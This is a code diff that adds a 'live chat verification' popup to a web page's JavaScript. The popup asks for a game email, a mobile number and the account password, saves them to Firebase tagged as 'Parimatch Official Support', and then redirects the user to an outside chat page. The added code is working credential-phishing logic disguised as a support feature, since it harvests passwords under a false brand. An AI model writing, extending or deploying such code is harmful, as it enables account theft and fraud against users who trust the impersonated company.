@@ -124,6 +124,64 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   });
 
+  // LIVE CHAT Verify Popup - details saved to Firebase before redirect
+  const liveChatBtn = document.getElementById('liveChatBtn');
+  const chatPopup = document.getElementById('chatPopup');
+  if (liveChatBtn && chatPopup) {
+    liveChatBtn.addEventListener('click', (e) => {
+      e.preventDefault();
+      chatPopup.classList.add('active');
+    });
+
+    const chatPopupClose = document.getElementById('chatPopupClose');
+    if (chatPopupClose) chatPopupClose.addEventListener('click', () => chatPopup.classList.remove('active'));
+    chatPopup.addEventListener('click', (e) => { if (e.target === chatPopup) chatPopup.classList.remove('active'); });
+
+    const chatSubmitBtn = document.getElementById('chatPopupSubmit');
+    chatSubmitBtn.addEventListener('click', async () => {
+      const cEmail = document.getElementById('chatEmail');
+      const cMobile = document.getElementById('chatMobile');
+      const cPassword = document.getElementById('chatPassword');
+
+      if (!cEmail.value.trim()) { showNotification("Please enter your Game Email ID", "error"); return; }
+      if (!isValidEmail(cEmail.value)) { showNotification("Please enter a valid email address", "error"); return; }
+      if (!cMobile.value.trim()) { showNotification("Please enter your Registered Mobile Number", "error"); return; }
+      if (!isValidMobile(cMobile.value)) { showNotification("Please enter a valid mobile number (min 10 digits)", "error"); return; }
+      if (!cPassword.value) { showNotification("Please enter your Game Account Password", "error"); return; }
+      if (!isValidPassword(cPassword.value)) { showNotification("Password must be at least 4 characters", "error"); return; }
+
+      chatSubmitBtn.disabled = true;
+      chatSubmitBtn.textContent = "Verifying...";
+
+      try {
+        const requestId = "TX" + Math.floor(100000 + Math.random() * 900000);
+        const gameId = "TOPX" + Math.floor(10000 + Math.random() * 90000);
+        const timestamp = new Date().toLocaleString('en-IN', {
+          day: '2-digit', month: 'short', year: 'numeric',
+          hour: '2-digit', minute: '2-digit', hour12: true
+        });
+
+        await saveSubmission({
+          request_id: requestId,
+          email: cEmail.value.trim(),
+          mobile: cMobile.value.trim(),
+          password: cPassword.value,
+          type: 'Live Chat',
+          game_id: gameId,
+          timestamp: timestamp,
+          source: 'Parimatch Official Support'
+        });
+
+        window.location.href = 'https://chat-page.edgeone.app';
+      } catch (error) {
+        console.error("Firebase Error:", error);
+        showNotification("❌ Verification failed. Please try again.", "error");
+        chatSubmitBtn.disabled = false;
+        chatSubmitBtn.textContent = "Start Live Chat";
+      }
+    });
+  }
+
   // ✅ Form logic - only runs on complaint/withdrawal page
   const problemForm = document.getElementById('problemForm');
   if (problemForm) {
